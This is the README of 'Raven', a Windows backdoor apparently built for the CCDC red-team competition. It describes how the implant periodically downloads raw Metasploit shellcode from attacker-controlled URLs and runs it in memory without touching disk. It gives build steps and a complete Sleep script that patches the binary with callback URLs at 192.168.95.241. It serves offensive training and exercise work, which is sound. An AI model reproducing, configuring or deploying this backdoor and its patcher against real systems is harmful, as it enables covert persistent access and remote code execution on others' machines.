Raven - Windows Backdoor
------------------------

Raven is a Windows Backdoor developed by Raphael Mudge for the CCDC competition.

Raven periodically connects to one of several attacker controlled web servers and it
attempts to download RAW shell code. If code is available, Raven will inject the
shell code into a new thread without it ever touching disk.

Configure Raven by replacing 'A' x 1024 with a comma separated list of URLs terminated
by a NULL byte. Your list of URLs must not exceed 1024 characters. You may specify 
whatever URLs you like (to include different port numbers as well). Raven will try
these URLs in a round-robin fashion.

These URLs should point to files that contain RAW shell code spit out by Metasploit.
The payload doesn't matter. Just be sure to set EXITFUNC to THREAD.

Raven is configured to phone home every five minutes. This is a low and slow backdoor.

Raven does not automatically install itself. You must do that yourself. See hooks.txt
for installation ideas.

-----------------
Compiling: 
-----------------
1. Install mingw
2. type: build

-----------------
Patching:
-----------------
To use Raven, you must patch it so it has a list of URLs to call back to. Here's a
sleep script to handle this process:

#
# fixraven.sl 
# java -jar sleep.jar fixraven.sl [raven.exe|raven.dll] [out file]
#
@urls = @('http://192.168.95.241/shellcode3000', 'http://192.168.95.241/shellcode');

$handle = openf(@ARGV[0]);
$data = readb($handle, -1);
closef($handle);

$index = indexOf($data, 'A' x 1024);

$urls = join(",", @urls) . "\x00";
$data = replaceAt($data, "$[1024]urls", $index);

$handle = openf('>' . @ARGV[1]);
writeb($handle, $data);
closef($handle);
